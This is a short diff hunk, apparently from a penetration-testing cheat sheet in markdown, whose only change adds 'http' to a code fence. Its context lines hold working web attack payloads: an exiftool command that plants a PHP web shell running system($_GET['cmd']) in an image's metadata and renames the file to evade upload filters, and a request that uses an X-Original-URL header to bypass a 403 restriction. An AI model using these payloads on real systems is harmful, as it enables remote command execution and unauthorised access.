@@ -171,7 +171,7 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 mv evil.jpg evil.php.jpg
 ```
 ### 401/403 Bypass
-```
+```http
 GET /api/getUser --> 403
 GET / + X-Original-URL : /api/GetUser --> 200
 
